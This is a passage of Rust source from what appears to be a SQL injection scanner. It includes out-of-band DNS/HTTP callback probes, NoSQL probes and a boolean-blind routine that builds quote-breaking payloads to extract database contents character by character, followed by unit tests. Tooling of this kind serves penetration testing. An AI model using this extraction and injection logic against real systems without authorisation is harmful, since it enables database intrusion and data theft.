    target: &TargetUrl,
    raw: Option<&RawRequest>,
    injected_body: &str,
) -> RequestSpec {
    use http::Method;
    let method = raw
        .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
        .unwrap_or(Method::POST);
    let mut headers = http::HeaderMap::new();
    headers.insert(
        http::header::CONTENT_TYPE,
        http::HeaderValue::from_static("application/json"),
    );
    if let Some(r) = raw {
        for (k, v) in &r.headers {
            if k.eq_ignore_ascii_case("content-type") || k.eq_ignore_ascii_case("content-length") {
                continue;
            }
            if let (Ok(name), Ok(val)) = (
                http::HeaderName::from_bytes(k.as_bytes()),
                http::HeaderValue::from_str(v),
            ) {
                headers.insert(name, val);
            }
        }
    }
    RequestSpec::new(method, target.as_str().to_owned())
        .with_headers(headers)
        .with_body(injected_body.as_bytes().to_vec())
}

/// Envoi basse-niveau d'un `RequestSpec` `NoSQL` sous timeout booléen
/// (`RequestClass::Boolean`), compté et borné comme les autres sondes.
/// Transport/body-read en échec → `(String::new(), ms, 0)` (jamais scoré).
async fn fetch_spec_boolean(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    spec: RequestSpec,
) -> (String, f64, u16) {
    let start = Instant::now();
    let resp = client
        .send_with_retry_for_class(spec, RequestClass::Boolean, cancel)
        .await;
    let elapsed = start.elapsed().as_secs_f64() * 1000.0;
    state.write().await.increment_requests();
    match resp {
        Ok(r) => {
            let status = r.status().as_u16();
            match client
                .read_body_string_for_class(r, RequestClass::Boolean)
                .await
            {
                Ok(body) => (body, elapsed, status),
                Err(e) => {
                    warn!(error=%e, "nosql probe body read failed, skipping score");
                    (String::new(), elapsed, 0)
                }
            }
        }
        Err(e) => {
            warn!(error=%e, "nosql probe request failed, skipping score");
            (String::new(), elapsed, 0)
        }
    }
}

/// OOB detection: send DNS/HTTP probes embedding a unique token, then poll the
/// collaborator for the callback.
///
/// OPT-IN: skipped silently when `oob_domain` is `None` (no infra). Invalid
/// domains are rejected with a warning. Without `oob_poll_url` probes are
/// still sent but never auto-confirmed — the operator checks the collaborator
/// UI manually for `<token>.<domain>` (no finding is emitted without
/// evidence, to avoid false positives).
///
/// Flow per parameter: one fresh token, up to 3 DBMS-generic probes (each
/// with tamper variants), cancellable wait for the async DB-side query,
/// then poll (`HttpPollVerifier` or `NoopVerifier`). A finding
/// (`TechniqueKind::Oob`, confidence 0.95) is pushed only on callback.
#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
async fn test_oob_bounded(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    baseline: &baseline::Baseline,
    marker_set: &MarkerSet,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    level: u8,
    ignore_codes: &[u16],
    oob_domain: Option<String>,
    oob_poll_url: Option<String>,
    oob_wait_secs: u64,
    seed: Option<u64>,
    context: &InjectionContext,
    dbms_belief: &DbmsBelief,
) {
    use crate::techniques::oob::verifier::OobVerifier as _;
    let (top_dbms, top_prob) = dbms_belief.top_candidate();
    debug!(param = param.key(), context = context.summary(), %top_dbms, top_prob, "oob: context-aware detection");
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    let Some(domain) = oob_domain else {
        return;
    };
    if !is_valid_oob_domain(&domain) {
        warn!(domain=%domain, "invalid --oob-domain, skipping OOB probes");
        return;
    }
    let token = new_token();
    let detector = OobDetector::new(domain.clone());
    let baseline_body = matcher.pre_process(&baseline.representative_body_str());
    // DBMS-aware OOB cores once the belief is actionable (>= 0.85, same bar
    // as `fill_missing_dbms`); otherwise the generic 3-probe sweep.
    let payloads = oob_payloads_for(dbms_payload_label(dbms_belief), &domain, &token);
    let tamper_sets = tamper_transformation_sets(tampers);
    let has_poll_url = oob_poll_url
        .as_deref()
        .is_some_and(|u| !u.trim().is_empty());

    // Phase 1 — send probes (one token shared so a single poll correlates any
    // DBMS vector). Cap at 3 payloads x tamper variants to bound requests.
    // Keep the last response for evidence; OOB is async so the body is
    // expected to match baseline.
    let mut last_body = baseline_body.clone();
    let mut last_ms = baseline.mean_ms;
    let mut last_status: u16 = 0;
    let mut last_payload_idx = 0usize;
    let mut probes_sent = 0usize;
    for (pi, p) in payloads
        .iter()
        .take(payload_budget(level, 3, payloads.len()))
        .enumerate()
    {
        if cancel.is_cancelled() {
            return;
        }
        for trans in &tamper_sets {
            if cancel.is_cancelled() {
                return;
            }
            let tampered = build_final_payload_with_rng(&p.payload, trans, popts, &mut rng);
            let (raw_body, ms, status) = fetch_for_payload_with_class(
                client,
                state,
                cancel,
                target,
                target_str,
                param,
                &tampered,
                marker_set,
                raw,
                opts,
                popts,
                RequestClass::Oob,
            )
            .await;
            probes_sent += 1;
            // `--ignore-code`: an ignored probe response is discarded
            // (kept baseline-neutral); the final gate below vetoes when the
            // last probe was ignored — never a finding.
            if is_ignored(status, ignore_codes) {
                last_status = status;
                if !has_poll_url {
                    // Without confirmation infra one variant per payload is enough;
                    // the operator checks the collaborator UI manually.
                    break;
                }
                continue;
            }
            last_body = matcher.pre_process(&raw_body);
            last_ms = ms;
            last_status = status;
            last_payload_idx = pi;
            if !has_poll_url {
                // Without confirmation infra one variant per payload is enough;
                // the operator checks the collaborator UI manually.
                break;
            }
        }
    }
    if probes_sent == 0 {
        return;
    }

    if !has_poll_url {
        let p = &payloads[last_payload_idx.min(payloads.len().saturating_sub(1))];
        let r = detector.evaluate_without_callback(
            &baseline_body,
            &last_body,
            baseline.mean_ms,
            last_ms,
            p,
        );
        if r.confidence >= 0.35 {
            info!(
                token=%p.token,
                fqdn=%p.fqdn,
                channel=%p.channel.to_string(),
                "oob probe sent (no --oob-poll-url) — check collaborator for callback, no auto-finding"
            );
        }
        return;
    }

    // Phase 2 — single wait + poll for the shared token (async DB execution
    // + collaborator propagation lag). Bounded: 1 wait + up to 3 polls.
    let wait = core::time::Duration::from_secs(oob_wait_secs.clamp(0, 30));
    if !wait.is_zero() {
        tokio::select! {
            () = cancel.cancelled() => return,
            () = tokio::time::sleep(wait) => {},
        }
    }
    let poll_verifier = crate::techniques::oob::verifier::HttpPollVerifier::new(
        oob_poll_url.clone().unwrap_or_default(),
        8,
    );
    let mut callback_seen = false;
    for _ in 0..3 {
        if cancel.is_cancelled() {
            return;
        }
        if poll_verifier.verify(&token).await {
            callback_seen = true;
            break;
        }
        tokio::select! {
            () = cancel.cancelled() => return,
            () = tokio::time::sleep(core::time::Duration::from_secs(2)) => {},
        }
    }
    let p = &payloads[last_payload_idx.min(payloads.len().saturating_sub(1))];
    // `--ignore-code`: never confirm on an ignored final response.
    if is_ignored(last_status, ignore_codes) {
        return;
    }
    let r = detector.evaluate_with_callback(
        &baseline_body,
        &last_body,
        baseline.mean_ms,
        last_ms,
        p,
        callback_seen,
    );
    if r.is_vulnerable {
        // Matcher veto gate: `Some(false)` rejects the candidate.
        if matcher.matches(&last_body, last_status) == Some(false) {
            return;
        }
        let mut finding = crate::session::state::Finding::new(
            target.as_str(),
            param.key(),
            crate::session::state::TechniqueKind::Oob,
            r.confidence,
            format!(
                "oob channel={} dbms={} token={} fqdn={} probes={}{}{}{}",
                r.channel,
                r.dbms.as_deref().unwrap_or("?"),
                r.token,
                p.fqdn,
                probes_sent,
                opts.evidence_suffix(),
                popts.evidence_suffix(),
                matcher.evidence_suffix(),
            ),
        )
        // C7: collaborator callback = strongest confirmation available.
        .with_false_positive_prob(0.01)
        .with_waf(baseline.waf_vendor.clone(), baseline.is_waf_blocking());
        finding.dbms = r.dbms.clone();
        state.write().await.push_finding(finding);
    }
}

/// Helper to extract a single field (databases, tables, columns, dump, count) via boolean-based blind `SQLi`.
/// Uses binary search on ASCII values with the provided query.
/// Dialect-aware: length/char comparison built from `DbmsKind`
/// (`LEN` on MSSQL, `SUBSTR` on Oracle, `::text` cast on Postgres).
#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
async fn extract_enum_field(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    baseline_body: &str,
    baseline_mean: f64,
    query: String,
    label: String,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    dbms_kind: &crate::dbms::DbmsKind,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    _ignore_codes: &[u16],
    seed: Option<u64>,
) -> Result<Option<String>, crate::error::InjektError> {
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    let engine = crate::extraction::engine::ExtractionEngine::new(
        crate::extraction::engine::ExtractionConfig::default(),
    );

    // Single source of truth for dialect SQL: reuse the `DbmsDetector`
    // `length_expr` / `ascii_cmp_expr` impls instead of re-matching on kind.
    let detector = crate::dbms::common::detector_for_kind(dbms_kind);
    // Matcher pre-processing (`--text-only` strips HTML) is applied to both
    // baseline and fetched bodies before `diff_against_baseline` so the
    // comparison stays consistent. No veto by `--code`/`--string` here:
    // enumeration is detection-only (a veto would only hide data).
    let baseline_proc = matcher.pre_process(baseline_body);

    // First infer length (max 500 chars for enum results).
    // Transport/body errors are never scored: the guess is skipped (no
    // break, no length update) so a transient blip cannot truncate
    // inference. Persistent failure aborts gracefully with `Ok(None)`.
    let mut inferred_len = 0;
    let mut consecutive_errors = 0usize;
    for len_guess in 1..=500 {
        if cancel.is_cancelled() {
            break;
        }
        let base = format!("' AND {}>={len_guess} -- -", detector.length_expr(&query));
        let payload = build_final_payload_with_rng(&base, tampers, popts, &mut rng);
        let spec = build_injection_spec_with_raw(
            target, target_str, param, &payload, marker_set, raw, opts, popts,
        );
        let start = std::time::Instant::now();
        let resp = client.send_with_retry(spec, cancel).await;
        let ms = start.elapsed().as_secs_f64() * 1000.0;
        state.write().await.increment_requests();
        let raw_body = match resp {
            Ok(r) => match client.read_body_string_with_timeout(r).await {
                Ok(b) => b,
                Err(e) => {
                    warn!(error=%e, label=%label, len_guess, "enum probe body read failed, skipping guess");
                    consecutive_errors += 1;
                    if consecutive_errors >= 5 {
                        warn!(label=%label, "enum aborted after 5 consecutive transport errors");
                        return Ok(None);
                    }
                    continue;
                }
            },
            Err(e) => {
                warn!(error=%e, label=%label, len_guess, "enum probe failed, skipping guess");
                consecutive_errors += 1;
                if consecutive_errors >= 5 {
                    warn!(label=%label, "enum aborted after 5 consecutive transport errors");
                    return Ok(None);
                }
                continue;
            }
        };
        consecutive_errors = 0;
        let body = matcher.pre_process(&raw_body);
        let diff = crate::detection::response_diff::diff_against_baseline(
            &baseline_proc,
            &body,
            baseline_mean,
            ms,
            100.0,
        );
        if diff.confidence < 0.4 {
            inferred_len = len_guess;
        } else {
            break;
        }
    }
    if inferred_len == 0 {
        warn!(label=%label, "enumeration length inference failed");
        return Ok(None);
    }

    let client_clone = client.clone();
    let state_clone = Arc::clone(state);
    let cancel_clone = cancel.clone();
    let target_clone = target.clone();
    let target_str_clone = target_str.to_owned();
    let param_clone = param.clone();
    let marker_set_clone = marker_set.clone();
    let baseline_body_clone = baseline_proc.clone();
    let baseline_mean_clone = baseline_mean;
    let query_for_oracle = query.clone();
    let raw_for_oracle = raw.cloned();
    let tampers_for_oracle = tampers.to_vec();
    let dbms_for_oracle = *dbms_kind;
    let popts_for_oracle = (*popts).clone();
    let matcher_for_oracle = matcher.clone();
    let seed_for_oracle = seed;

    let oracle = move |pos: usize, mid: u8| {
        let client = client_clone.clone();
        let state = state_clone.clone();
        let cancel = cancel_clone.clone();
        let target = target_clone.clone();
        let target_str = target_str_clone.clone();
        let param = param_clone.clone();
        let marker_set = marker_set_clone.clone();
        let baseline_body = baseline_body_clone.clone();
        let query = query_for_oracle.clone();
        let raw = raw_for_oracle.clone();
        let tampers = tampers_for_oracle.clone();
        let dbms_kind = dbms_for_oracle;
        let popts = popts_for_oracle.clone();
        let matcher = matcher_for_oracle.clone();
        let seed = seed_for_oracle;
        async move {
            let detector = crate::dbms::common::detector_for_kind(&dbms_kind);
            let cmp = detector.ascii_cmp_expr(&query, pos, mid);
            let base = format!("' AND {cmp} -- -");
            // Fresh RNG per oracle call from the run seed: deterministic per
            // `--seed`, independent of async scheduling order.
            let mut oracle_rng = crate::seeded_rng::make_rng(seed);
            let payload = build_final_payload_with_rng(&base, &tampers, &popts, &mut oracle_rng);
            // Transport/body errors are retried (bounded) then propagated as
            // `Err` — never scored as `""`. The engine treats `Err` as an
            // abstention/retry, so one hiccup cannot corrupt a bit.
            let mut last_err: Option<String> = None;
            for _ in 0..3 {
                let spec = build_injection_spec_with_raw(
                    &target,
                    &target_str,
                    &param,
                    &payload,
                    &marker_set,
                    raw.as_ref(),
                    opts,
                    &popts,
                );
                let start = std::time::Instant::now();
                let resp = client.send_with_retry(spec, &cancel).await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                state.write().await.increment_requests();
                let raw_body = match resp {
                    Ok(r) => match client.read_body_string_with_timeout(r).await {
                        Ok(b) => b,
                        Err(e) => {
                            warn!(error=%e, pos, mid, "enum oracle body read failed, retrying");
                            last_err = Some(e.to_string());
                            continue;
                        }
                    },
                    Err(e) => {
                        warn!(error=%e, pos, mid, "enum oracle probe failed, retrying");
                        last_err = Some(e.to_string());
                        continue;
                    }
                };
                let body = matcher.pre_process(&raw_body);
                let diff = crate::detection::response_diff::diff_against_baseline(
                    &baseline_body,
                    &body,
                    baseline_mean_clone,
                    ms,
                    100.0,
                );
                return Ok::<bool, InjektError>(diff.confidence < 0.4);
            }
            Err::<bool, InjektError>(InjektError::Http(format!(
                "enum oracle transport failure at pos {pos} mid {mid}: {}",
                last_err.unwrap_or_else(|| "unknown".to_owned())
            )))
        }
    };

    let extracted = match engine.extract(inferred_len, oracle, cancel).await {
        Ok(value) => value,
        Err(crate::error::InjektError::Cancelled) => {
            return Err(crate::error::InjektError::Cancelled);
        }
        Err(error) => {
            // Speculative helper: an unstable oracle on a non-boolean sink is
            // the expected negative, not an actionable error. Demote to debug
            // so bulk scans don't drown in `inference inconsistency` noise.
            tracing::debug!(label=%label, error=%error, "enum oracle unstable, skipping field");
            return Ok(None);
        }
    };
    let exposed = {
        use secrecy::ExposeSecret;
        extracted.expose_secret().to_owned()
    };
    info!(label=%label, extracted=%crate::session::scrubber::Scrubber::hash_truncated(&exposed), len=%exposed.len(), "enumeration extracted");
    Ok(Some(exposed))
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod orchestrator_gating_tests {
    use super::{
        apply_outcome_to_hypothesis, dbms_payload_label, has_confirmed_finding,
        infer_signal_and_trials, is_confirmed_finding, is_extraction_eligible,
        order_boolean_by_context, order_by_prefix_for_context, parse_finding_dbms,
    };
    use crate::{
        dbms::{
            DbmsKind,
            context::{DbmsBelief, InjectionContext, QuoteContext},
        },
        detection::baseline::{Baseline, Sample},
        reasoning::Hypothesis,
        session::state::{Finding, TechniqueKind},
    };
    use std::time::Duration;

    fn finding(technique: TechniqueKind, confidence: f64, evidence: &str) -> Finding {
        Finding::new(
            "https://example.com/?id=1",
            "id@query",
            technique,
            confidence,
            evidence,
        )
    }

    #[test]
    fn unconfirmed_error_does_not_count_as_confirmed() {
        let f = finding(
            TechniqueKind::Error,
            0.55,
            "error pattern X bool_confirm=false unconfirmed",
        );
        assert!(!is_confirmed_finding(&f));
        assert!(!has_confirmed_finding(&[f]));
    }

    #[test]
    fn boolean_and_confirmed_error_count() {
        let b = finding(
            TechniqueKind::Boolean,
            0.8,
            "boolean true_sim=0.9 false_sim=0.1",
        );
        let e = finding(
            TechniqueKind::Error,
            0.9,
            "error extracted=yes bool_confirm=true",
        );
        assert!(is_confirmed_finding(&b));
        assert!(has_confirmed_finding(&[e]));
        // Mixed: one confirmed suffices even with an unconfirmed alongside.
        let u = finding(TechniqueKind::Error, 0.55, "error unconfirmed");
        assert!(has_confirmed_finding(&[u, b]));
    }

    #[test]
    fn stacked_or_time_only_is_confirmed_but_not_oracle_eligible() {
        // Post-#17/#18 findings are confirmed (two-shot), but they cannot
        // feed a boolean-differential oracle: enumeration must stay silent.
        let stacked = finding(
            TechniqueKind::Stacked,
            0.6,
            "stacked dbms=generic marker=stacked_abc tamper=none confirmed=true",
        );
        let time = finding(
            TechniqueKind::Time,
            0.75,
            "time delay 3000ms > threshold 300ms tamper=none control=50ms",
        );
        assert!(has_confirmed_finding(&[stacked.clone(), time.clone()]));
        assert!(!is_extraction_eligible(&[stacked, time]));
    }

    #[test]
    fn boolean_stays_oracle_eligible() {
        let b = finding(
            TechniqueKind::Boolean,
            0.8,
            "boolean true_sim=0.9 false_sim=0.1",
        );
        assert!(has_confirmed_finding(std::slice::from_ref(&b)));
        assert!(is_extraction_eligible(std::slice::from_ref(&b)));
    }

    // v0.5-4 loop-closure: `>= 0.85` bar drives quote-correct payloads.

    #[test]
    fn dbms_label_needs_point_eight_five() {
        assert_eq!(dbms_payload_label(&DbmsBelief::uniform()), None);
        let mut confident = DbmsBelief::uniform();
        confident.update_with_signal(DbmsKind::MySql, 0.9);
        assert_eq!(dbms_payload_label(&confident), Some("mysql"));
        let mut weak = DbmsBelief::uniform();
        weak.update_with_signal(DbmsKind::Postgres, 0.6);
        // 0.6 signal still normalizes below the 0.85 fill bar.
        assert_eq!(dbms_payload_label(&weak), None);
    }

    #[test]
    fn finding_dbms_roundtrip() {
        assert_eq!(parse_finding_dbms(Some("mysql")), Some(DbmsKind::MySql));
        assert_eq!(
            parse_finding_dbms(Some("PostgreSQL")),
            Some(DbmsKind::Postgres)
        );
        assert_eq!(parse_finding_dbms(Some("mssql")), Some(DbmsKind::MsSql));
        assert_eq!(parse_finding_dbms(Some("oracle")), Some(DbmsKind::Oracle));
        assert_eq!(parse_finding_dbms(Some("sqlite")), Some(DbmsKind::Sqlite));
        assert_eq!(parse_finding_dbms(None), None);
        assert_eq!(parse_finding_dbms(Some("unknown-db")), None);
    }

    #[test]
    fn finding_label_keeps_sqlite_quote_style() {
        // P0-3: a confirmed sqlite finding must drive `--`-style confirm
        // payloads (was: `None` → generic `-- -` polyglots).
        use crate::session::state::{Finding, TechniqueKind};
        let mut f = Finding::new("http://a", "id@query", TechniqueKind::Error, 0.9, "e");
        f.dbms = Some("sqlite".to_owned());
        assert_eq!(super::dbms_label_from_finding(&f), Some("sqlite"));
        f.dbms = Some("  SQLITE ".to_owned());
        assert_eq!(super::dbms_label_from_finding(&f), Some("sqlite"));
        f.dbms = None;
        assert_eq!(super::dbms_label_from_finding(&f), None);
        f.dbms = Some("unknown-db".to_owned());
        assert_eq!(super::dbms_label_from_finding(&f), None);
    }

    #[test]
    fn json_scan_appends_graphql_after_direct() {
        // P0-2: `variables`-envelope probes ride last so L1 (`take(2)`)
        // stays byte-identical to the historical direct sweep.
        let v = super::json_scan_payloads(None);
        assert_eq!(v.len(), 5, "{v:?}");
        assert!(
            !v[0].true_payload.contains("variables"),
            "{}",
            v[0].true_payload
        );
        assert!(
            !v[1].true_payload.contains("variables"),
            "{}",
            v[1].true_payload
        );
        assert!(
            !v[2].true_payload.contains("variables"),
            "{}",
            v[2].true_payload
        );
        assert!(
            v[3].true_payload.contains("\"variables\""),
            "{}",
            v[3].true_payload
        );
        assert!(
            v[4].true_payload.contains("\"variables\""),
            "{}",
            v[4].true_payload
        );
        // DBMS-narrowed belief keeps only its own envelope probe.
        let mysql = super::json_scan_payloads(Some("mysql"));
        assert_eq!(mysql.len(), 3, "{mysql:?}");
        assert!(mysql[2].true_payload.contains("\"variables\""));
        // sqlite has no envelope probe (falls back to generic direct).
        let sqlite = super::json_scan_payloads(Some("sqlite"));
        assert_eq!(sqlite.len(), 3, "{sqlite:?}");
        assert!(
            sqlite.iter().all(|p| !p.true_payload.contains("variables")),
            "{sqlite:?}"
        );
    }

    #[test]
    fn boolean_order_follows_quote_context() {
        use crate::techniques::boolean::payloads::boolean_payloads_for;
        let mut numeric_ctx = InjectionContext::new();
        numeric_ctx.quote = QuoteContext::None;
        numeric_ctx.numeric = true;
        let mut payloads = boolean_payloads_for(None);
        order_boolean_by_context(&mut payloads, &numeric_ctx);
        assert!(
            payloads
                .first()
                .is_some_and(|p| p.true_payload.starts_with('1')),
            "numeric bare must lead with `1 AND/OR`"
        );

        let mut dq_ctx = InjectionContext::new();
        dq_ctx.quote = QuoteContext::DoubleQuote;
        let mut payloads = boolean_payloads_for(None);
        order_boolean_by_context(&mut payloads, &dq_ctx);
        assert!(
            payloads
                .first()
                .is_some_and(|p| p.true_payload.starts_with('"')),
            "double-quote must lead with `\"`"
        );
    }

    #[test]
    fn order_by_prefix_is_quote_correct() {
        let mut ctx = InjectionContext::new();
        ctx.quote = QuoteContext::DoubleQuote;
        assert_eq!(order_by_prefix_for_context(&ctx), "\"");
        let mut numeric = InjectionContext::new();
        numeric.quote = QuoteContext::None;
        numeric.numeric = true;
        assert_eq!(order_by_prefix_for_context(&numeric), "");
        assert_eq!(order_by_prefix_for_context(&InjectionContext::new()), "'");
    }

    #[test]
    fn oob_payloads_narrow_with_confident_belief() {
        use crate::techniques::oob::payloads::oob_payloads_for;
        let mut belief = DbmsBelief::uniform();
        belief.update_with_signal(DbmsKind::MsSql, 0.9);
        let label = dbms_payload_label(&belief);
        assert_eq!(label, Some("mssql"));
        let narrowed = oob_payloads_for(label, "example.oob", "tok123");
        assert!(!narrowed.is_empty());
        assert!(narrowed.iter().all(|p| p.dbms == "mssql"));
        let generic = oob_payloads_for(None, "example.oob", "tok123");
        assert_eq!(generic.len(), 3);
    }

    #[test]
    fn confirmed_dbms_finding_promotes_hypothesis_belief() {
        let baseline = Baseline::new(&[
            Sample {
                status: 200,
                body: b"ok".to_vec(),
                duration: Duration::from_millis(50),
                headers: Vec::new(),
            },
            Sample {
                status: 200,
                body: b"ok".to_vec(),
                duration: Duration::from_millis(51),
                headers: Vec::new(),
            },
            Sample {
                status: 200,
                body: b"ok".to_vec(),
                duration: Duration::from_millis(52),
                headers: Vec::new(),
            },
        ]);
        let mut hyp = Hypothesis::new(
            "id@query".to_owned(),
            TechniqueKind::Union,
            DbmsBelief::uniform(),
            InjectionContext::new(),
        );
        let mut f = finding(
            TechniqueKind::Union,
            0.9,
            "union columns=3 order_by_inferred=3 tamper=none",
        );
        f.dbms = Some("postgres".to_owned());
        apply_outcome_to_hypothesis(&mut hyp, TechniqueKind::Union, &[f], 5, &baseline);
        let (top, prob) = hyp.dbms_belief.top_candidate();
        assert_eq!(top, DbmsKind::Postgres);
        assert!(prob >= 0.85, "post-promotion prob {prob} < 0.85");
        assert!(hyp.is_confirmed());
    }

    #[test]
    fn signal_calibration_matches_provisional_table() {
        // Provisional v0.5 table (recalibrate on `history.jsonl` once 5+ runs
        // per scenario exist): boolean/error 0.9, union 0.85, time/stacked
        // 0.8, json boolean-channel 0.9 else 0.75, oob 1.0.
        let confirmed = finding(TechniqueKind::Boolean, 0.9, "boolean ok");
        assert_eq!(
            infer_signal_and_trials(TechniqueKind::Boolean, &[confirmed], false),
            (0.9, 1)
        );
        let confirmed = finding(TechniqueKind::Union, 0.9, "union ok");
        assert_eq!(
            infer_signal_and_trials(TechniqueKind::Union, &[confirmed], false),
            (0.85, 1)
        );
        let confirmed = finding(TechniqueKind::Time, 0.8, "time ok");
        assert_eq!(
            infer_signal_and_trials(TechniqueKind::Time, &[confirmed], false),
            (0.8, 1)
        );
        let unconfirmed = finding(TechniqueKind::Error, 0.55, "error unconfirmed");
        assert_eq!(
            infer_signal_and_trials(TechniqueKind::Error, &[unconfirmed], true),
            (0.4, 0)
        );
    }

    #[test]
    fn budget_request_budget_defaults_to_none_and_helper() {
        // CODE calibration: default None = unlimited, byte-identical.
        // A1 evasion (~1032 req live) must never trip a default cap.
        let cfg = super::BudgetConfig::default();
        assert_eq!(cfg.request_budget, None);
        assert!(!super::BudgetConfig::is_over_request_budget(0, None));
        assert!(!super::BudgetConfig::is_over_request_budget(10_000, None));
        // Zero budget trips immediately (early-break path, cooperative stop).
        assert!(super::BudgetConfig::is_over_request_budget(0, Some(0)));
        assert!(super::BudgetConfig::is_over_request_budget(11, Some(0)));
        // Boundary: `>=` trips exactly at the cap, never before.
        assert!(!super::BudgetConfig::is_over_request_budget(24, Some(25)));
        assert!(super::BudgetConfig::is_over_request_budget(25, Some(25)));
        assert!(super::BudgetConfig::is_over_request_budget(666, Some(25)));
        assert!(!super::BudgetConfig::is_over_request_budget(
            1031,
            Some(1032)
        ));
        assert!(super::BudgetConfig::is_over_request_budget(
            1032,
            Some(1032)
        ));
    }

    #[test]
    fn budget_max_duration_defaults_to_none_and_helper() {
        // Phase 3: default None = unlimited, byte-identical.
        let cfg = super::BudgetConfig::default();
        assert_eq!(cfg.max_duration_secs, None);
        let now = std::time::Instant::now();
        assert!(!super::BudgetConfig::is_over_max_duration(now, None));
        // Zero budget trips immediately (early-break path).
        assert!(super::BudgetConfig::is_over_max_duration(now, Some(0)));
        // Future start + generous budget does not trip.
        assert!(!super::BudgetConfig::is_over_max_duration(now, Some(3600)));
        // Past start beyond budget trips.
        let past = now
            .checked_sub(std::time::Duration::from_secs(10))
            .unwrap_or(now);
        assert!(super::BudgetConfig::is_over_max_duration(past, Some(5)));
        assert!(!super::BudgetConfig::is_over_max_duration(past, Some(60)));
    }

    #[test]
    fn detection_deadline_none_is_unlimited_noop() {
        // `None` (default) = no deadline: mid-technique checks no-op,
        // detection byte-identical.
        let now = std::time::Instant::now();
        assert_eq!(super::BudgetConfig::detection_deadline(now, None), None);
        assert!(!super::BudgetConfig::is_past_deadline(None));
    }

    #[test]
    fn detection_deadline_trips_after_budget() {
        use super::BudgetConfig;
        let now = std::time::Instant::now();
        // Zero budget: deadline is (about) now, already past.
        let zero = BudgetConfig::detection_deadline(now, Some(0)).expect("deadline");
        assert!(BudgetConfig::is_past_deadline(Some(zero)));
        // Generous budget: future deadline, not past.
        let far = BudgetConfig::detection_deadline(now, Some(3600)).expect("deadline");
        assert!(!BudgetConfig::is_past_deadline(Some(far)));
        // Past start beyond budget: deadline already behind us.
        let past = now
            .checked_sub(std::time::Duration::from_secs(10))
            .unwrap_or(now);
        let blown = BudgetConfig::detection_deadline(past, Some(5)).expect("deadline");
        assert!(BudgetConfig::is_past_deadline(Some(blown)));
    }

    #[test]
    fn detection_deadline_clamps_huge_values_without_silent_unlimited() {
        // PR20: `u64::MAX` used to make `checked_add` return `None`,
        // conflated with "unlimited". Now clamped to the 24h cap: always a
        // real (future) deadline, never a silent fail-open.
        use super::{BudgetConfig, MAX_DETECTION_DURATION_SECS_CAP};
        assert_eq!(MAX_DETECTION_DURATION_SECS_CAP, 86_400);
        let now = std::time::Instant::now();
        let clamped =
            BudgetConfig::detection_deadline(now, Some(u64::MAX)).expect("clamped deadline");
        assert!(!BudgetConfig::is_past_deadline(Some(clamped)));
        // The clamp equals the capped input (idempotent).
        let at_cap = BudgetConfig::detection_deadline(now, Some(86_400)).expect("cap deadline");
        assert!(!BudgetConfig::is_past_deadline(Some(at_cap)));
        // `is_over_max_duration` never panics on huge values and never trips
        // immediately (Duration compare, no overflow).
        assert!(!BudgetConfig::is_over_max_duration(now, Some(u64::MAX)));
        assert!(BudgetConfig::is_over_max_duration(now, Some(0)));
    }

    #[test]
    fn baseline_all_error_only_on_full_5xx() {
        // Live case: `[520, 520, 520]` (CF origin-unreachable) must warn.
        assert!(super::baseline_all_error(&[520, 520, 520]));
        assert!(super::baseline_all_error(&[500]));
        assert!(super::baseline_all_error(&[500, 503, 524]));
        // Healthy or mixed baselines must not warn.
        assert!(!super::baseline_all_error(&[200, 200, 200]));
        assert!(!super::baseline_all_error(&[200, 520, 520]));
        assert!(!super::baseline_all_error(&[403, 403, 403]));
        assert!(!super::baseline_all_error(&[]));
    }

    #[test]
    fn scheduler_ttfb_static_by_default_and_dynamic_when_slow() {
        use super::build_scheduler_for_param;
        use crate::detection::scanner::scheduler::{cost_for, cost_for_with_ttfb};
        let cfg = super::EngineConfig::default();
        let hyps: Vec<Hypothesis> = vec![
            Hypothesis::new(
                "id@query".to_owned(),
                TechniqueKind::Boolean,
                DbmsBelief::uniform(),
                InjectionContext::new(),
            ),
            Hypothesis::new(
                "id@query".to_owned(),
                TechniqueKind::Time,
                DbmsBelief::uniform(),
                InjectionContext::new(),
            ),
        ];
        // mean 0 => static costs (L1 byte-identical).
        let sched = build_scheduler_for_param(&cfg, "id@query", &hyps, 0, 0.0);
        assert_eq!(sched.len(), 2);
        let base_time = cost_for(TechniqueKind::Time);
        assert!((cost_for_with_ttfb(base_time, 0.0) - base_time).abs() < 1e-12);
        // mean 5s => time cost doubles (3.0 -> 6.0), boolean stays 1.0.
        let scaled = cost_for_with_ttfb(base_time, 5000.0);
        assert!((scaled - 6.0).abs() < 1e-12);
        let sched_slow = build_scheduler_for_param(&cfg, "id@query", &hyps, 0, 5000.0);
        assert_eq!(sched_slow.len(), 2);
    }

    #[tokio::test]
    async fn baseline_concurrent_returns_three_samples() {
        use crate::{
            engine::orchestrator::{Engine, EngineConfig},
            http::{client::HttpClient, jitter::Jitter, rate_limit::RateLimiter},
            target::url::TargetUrl,
        };
        use std::{sync::Arc, time::Duration};
        use tokio_util::sync::CancellationToken;
        use wiremock::{Mock, MockServer, ResponseTemplate, matchers::method};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .respond_with(ResponseTemplate::new(200).set_body_string("baseline-ok"))
            .mount(&server)
            .await;

        let client = HttpClient::builder()
